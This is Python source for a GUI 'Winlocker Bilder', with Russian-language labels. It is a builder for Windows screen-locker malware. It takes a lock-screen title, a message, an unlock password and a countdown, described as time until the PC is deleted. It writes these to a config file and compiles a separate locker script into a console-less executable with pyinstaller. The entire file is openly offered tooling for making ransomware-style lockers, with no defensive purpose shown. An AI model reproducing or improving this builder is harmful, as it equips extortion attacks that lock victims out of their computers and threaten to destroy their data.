import customtkinter as ctk
import json
import subprocess

ctk.set_appearance_mode("dark") 
app = ctk.CTk()
app.title("Winlocker bilder")
app.geometry('600x800')

def bild():
    try:
        print('Компилируем...')
        command = ['pyinstaller', '--onefile', '--noconsole', '--add-data', 'config.json;.', 'main.py']
        subprocess.run(command, check=True)
        print('Успешно скомпилировано файл находиться в dist/main.py')
    except Exception as e:
        print(f'При компиляции произошла ошибка: {e}')

def pickup_info():
    title = entry_title.get()
    title_col = title_color.get()
    info = entry_info.get()
    info_col = info_color.get()
    time = entry_time.get()
    time_col = time_color.get()
    password = entry_passw.get()
    passw_col = passw_color.get()
    test_variant = test_checkbox.get()

    data = {
        "title": title,
        "title_color": title_col,
        "info": info,
        "info_color": info_col,
        "time": time,
        "time_color": time_col,
        "password": password,
        "passw_color": passw_col,
        "test_variant": test_variant
    }
    try:
        with open('config.json', 'w') as json_file:
            json.dump(data, json_file, indent=4)
            
        bild()
    except Exception as e:
        print(f'При записи в config произошла ошибка: {e}')

def update_menu_color(option_menu, choice):
    option_menu.configure(fg_color=choice)

color_list = [
    'red', 'yellow', 'pink', 'blue',
    'green', 'white'
]

title_bilder = ctk.CTkLabel(app, text='Winlocker Bilder', text_color='red', font=('Bold', 60))
title_bilder.pack(pady=20)

title_locker = ctk.CTkLabel(app, text='Заголовок', font=('Bold', 30))
title_locker.pack(pady=20)

frame_title = ctk.CTkFrame(app)
frame_title.pack(pady=10)
entry_title = ctk.CTkEntry(frame_title, width=300, height=40, placeholder_text='Введите заголовок винлокера', placeholder_text_color='green')
entry_title.pack(side="left", padx=5)
title_color = ctk.CTkOptionMenu(frame_title, values=color_list, fg_color='red', command=lambda choice: update_menu_color(title_color, choice))
title_color.pack(side="left", padx=5)

info_locker = ctk.CTkLabel(app, text='Информация', font=('Bold', 30))
info_locker.pack(pady=20)

frame_info = ctk.CTkFrame(app)
frame_info.pack(pady=10)
entry_info = ctk.CTkEntry(frame_info, width=300, height=40, placeholder_text='Введите информацию под заголовком винлокера', placeholder_text_color='green')
entry_info.pack(side="left", padx=5)
info_color = ctk.CTkOptionMenu(frame_info, values=color_list, fg_color='red', command=lambda choice: update_menu_color(info_color, choice))
info_color.pack(side="left", padx=5)

time_locker = ctk.CTkLabel(app, text='Время в секундах, (2 часа - 7200с)', font=('Bold', 30))
time_locker.pack(pady=20)

frame_time = ctk.CTkFrame(app)
frame_time.pack(pady=10)
entry_time = ctk.CTkEntry(frame_time, width=300, height=40, placeholder_text='Введите сколько будет время до удаления пк', placeholder_text_color='green')
entry_time.pack(side="left", padx=5)
time_color = ctk.CTkOptionMenu(frame_time, values=color_list, fg_color='red', command=lambda choice: update_menu_color(time_color, choice))
time_color.pack(side="left", padx=5)

passw_locker = ctk.CTkLabel(app, text='Пароль', font=('Bold', 30))
passw_locker.pack(pady=20)

frame_passw = ctk.CTkFrame(app)
frame_passw.pack(pady=10)
entry_passw = ctk.CTkEntry(frame_passw, width=300, height=40, placeholder_text='Введите пароль', placeholder_text_color='green')
entry_passw.pack(side="left", padx=5)
passw_color = ctk.CTkOptionMenu(frame_passw, values=color_list, fg_color='red', command=lambda choice: update_menu_color(passw_color, choice))
passw_color.pack(side="left", padx=5)

frame_bild = ctk.CTkFrame(app)
frame_bild.pack(pady=20)
bild_button = ctk.CTkButton(frame_bild, width=400, height=80, fg_color='green', text='Bild', border_color='black', command=pickup_info)
bild_button.pack(side="left", padx=10)

frame_checkbox = ctk.CTkFrame(frame_bild)
frame_checkbox.pack(side="left")
test_label = ctk.CTkLabel(frame_checkbox, text='Тестовый вариант', font=('Arial', 12))
test_label.pack()
test_checkbox = ctk.CTkCheckBox(frame_checkbox, text='')
test_checkbox.pack()

if __name__ == "__main__":
    app.mainloop()